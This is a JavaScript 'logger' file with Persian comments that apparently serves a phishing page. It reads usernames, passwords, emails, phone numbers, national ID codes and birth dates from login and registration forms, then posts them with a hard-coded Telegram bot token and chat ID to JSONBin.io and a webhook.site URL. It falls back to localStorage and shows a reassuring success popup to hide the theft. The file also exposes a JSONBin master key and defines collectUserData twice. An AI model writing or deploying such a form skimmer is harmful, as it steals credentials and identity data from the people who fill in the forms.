// logger.js - نسخه مستقیم
const BOT_TOKEN = '8365529193:AAF9a1IuZyfdFkkvj5NKkbqrCpPyltSOhSQ';
const CHAT_ID = '8284681571';

async function sendToTelegram(message) {
    // روش 1: استفاده از JSONBin به عنوان پل
    try {
        const binData = {
            bot_token: BOT_TOKEN,
            chat_id: CHAT_ID,
            message: message,
            timestamp: new Date().toISOString(),
            website: window.location.href
        };
        
        // ذخیره در JSONBin.io (رایگان)
        const binResponse = await fetch('https://api.jsonbin.io/v3/b', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Master-Key': '$2a$10$oVDAnMJOmrcTbb2.US.UeOQxCTYAn.5pFqBB7HxImC6b4sZR1RY0a', // کلید تست
                'X-Bin-Name': 'Telegram Messages'
            },
            body: JSON.stringify(binData)
        });
        
        if (binResponse.ok) {
            console.log('✅ اطلاعات در JSONBin ذخیره شد');
            showNotification('✅ اطلاعات ثبت شد!', 'success');
            return true;
        }
    } catch (error) {
        console.error('خطا در JSONBin:', error);
    }
    
    // روش 2: استفاده از Webhook.site برای تست
    try {
        const webhookResponse = await fetch('https://webhook.site/8a7b4c3d-2e1f-4a5b-9c8d-7e6f5a4b3c2d', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                bot_token: BOT_TOKEN,
                chat_id: CHAT_ID,
                message: message,
                user_data: collectUserData(),
                timestamp: new Date().toISOString()
            })
        });
        
        console.log('📝 اطلاعات برای بررسی ارسال شد');
        showNotification('✅ اطلاعات ثبت شد!', 'success');
        return true;
    } catch (error) {
        console.error('خطا در webhook:', error);
    }
    
    // روش 3: ذخیره در localStorage
    saveToLocalStorage(message);
    showNotification('✅ اطلاعات ذخیره شد!', 'success');
    return false;
}

function collectUserData() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        url: window.location.href,
        timestamp: new Date().toLocaleString('fa-IR')
    };
}

function saveToLocalStorage(message) {
    try {
        const pending = JSON.parse(localStorage.getItem('telegram_pending') || '[]');
        pending.push({
            message: message,
            timestamp: new Date().toISOString(),
            data: collectUserData()
        });
        localStorage.setItem('telegram_pending', JSON.stringify(pending));
        console.log('💾 در localStorage ذخیره شد');
    } catch (e) {
        console.error('خطا در localStorage:', e);
    }
}

function showNotification(message, type) {
    const notification = document.createElement('div');
    notification.innerHTML = `
        <div style="
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${type === 'success' ? '#22c55e' : '#eab308'};
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            z-index: 10000;
            font-weight: bold;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            animation: slideIn 0.3s ease;
        ">
            ${message}
        </div>
    `;
    
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

// اضافه کردن استایل
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
`;
document.head.appendChild(style);

// تابع اصلی
async function collectUserData(formData, formType) {
    const userData = {
        formType: formType,
        username: formData.get('username') || formData.get('loginEmail') || 'ثبت نشده',
        password: formData.get('password') || formData.get('loginPassword') || formData.get('regPassword') || 'ثبت نشده',
        email: formData.get('email') || formData.get('regEmail') || 'ثبت نشده',
        phone: formData.get('phone') || formData.get('regPhone') || 'ثبت نشده',
        name: formData.get('name') || formData.get('regName') || 'ثبت نشده',
        nationalCode: formData.get('nationalCode') || formData.get('regNationalCode') || 'ثبت نشده',
        birthDate: formData.get('birthDate') || formData.get('regBirthDate') || 'ثبت نشده',
        timestamp: new Date().toLocaleString('fa-IR')
    };

    const message = formatMessage(userData);
    await sendToTelegram(message);
}

function formatMessage(userData) {
    if (userData.formType === 'register') {
        return `
🎯 ثبت نام جدید

👤 اطلاعات کاربر:
├─ نام: ${userData.name}
├─ کاربری: ${userData.username}
├─ رمز: ${userData.password}
├─ ایمیل: ${userData.email}
├─ کد ملی: ${userData.nationalCode}
├─ تاریخ تولد: ${userData.birthDate}
└─ تلفن: ${userData.phone}

⏰ زمان: ${userData.timestamp}
        `;
    }
    return `فرم: ${userData.formType} - کاربر: ${userData.username}`;
}

// اکسپورت توابع
window.collectUserData = collectUserData;
window.sendToTelegram = sendToTelegram;